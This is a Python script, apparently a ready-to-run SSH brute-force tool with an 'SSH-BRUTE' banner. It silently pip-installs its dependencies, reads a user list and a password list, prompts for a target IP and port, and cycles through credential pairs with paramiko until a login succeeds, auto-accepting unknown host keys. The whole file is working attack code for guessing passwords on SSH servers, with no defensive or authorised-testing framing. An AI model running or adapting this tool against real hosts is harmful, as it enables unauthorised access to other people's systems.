import os
import time
import platform
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import paramiko
    except ImportError:
        os.system("python3 -m pip install paramiko -q -q -q")
        import paramiko
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import paramiko
    except ImportError:
        os.system("python -m pip install paramiko -q -q -q")
        import paramiko
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
colorama.deinit()
banner = Center.XCenter("""
         ______ ____  _   _       ____  ____  _   _ _____ _____ _______
        / / ___/ ___|| | | |     | __ )|  _ \| | | |_   _| ____|___ /\ \`
       | |\___ \___ \| |_| |_____|  _ \| |_) | | | | | | |  _|   |_ \ | |
      < <  ___) |__) |  _  |_____| |_) |  _ <| |_| | | | | |___ ___) | > >
       | ||____/____/|_| |_|     |____/|_| \_\`\___/  |_| |_____|____/ | |
        \_\                                                          /_/
                            \n\n
""")
usr_arr = [];
pass_arr = []

try:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
    user_list = input(termcolor.colored("\n[*] Enter Path Of Users List:- ", 'green'))
    pass_list = file = input(termcolor.colored("\n[*] Enter Path Of Password List:- ", 'green'))
    host = input(termcolor.colored("\n[*] Enter target ip:- ", 'green'))
    port = input(termcolor.colored("\n[*] Enter port:- ", 'green'))
    print('\n')
    print(termcolor.colored("[+] BruteForce Started....",'blue'))
    print('\n')
except KeyboardInterrupt:
    print(termcolor.colored("[X] You Pressed The Exit Button!",'red'))
    quit()

users_lis = open(user_list, "r")
for l in users_lis:
    u = l.strip();
    usr_arr.append(u)
users_lis.close()

passwords = open(pass_list, "r")
for l in passwords:
    p = l.strip();
    pass_arr.append(p)
passwords.close()
i = 1;
x = 0;
u = 0
while i == 1:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
        client.connect(username=usr_arr[u], hostname=host, password=pass_arr[x], port=port)
        print(termcolor.colored("[✔] Valid Credentials Found\n",'cyan'))
        break
    except (paramiko.ssh_exception.AuthenticationException):
        print(termcolor.colored("[X] Password Not Found!\n",'red'));
        time.sleep(0.2)
        if x == len(pass_arr) - 1:
            x = 0
            if u == len(usr_arr) - 1:    break
            u += 1
        else:
            x += 1
        continue
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(termcolor.colored("Host Error or May Be something\n",'red'))
        quit()
    except:
        time.sleep(0.3);
        continue
    i += 1
print(termcolor.colored("[*] Completed...\n",'blue'));
client.close();
quit()
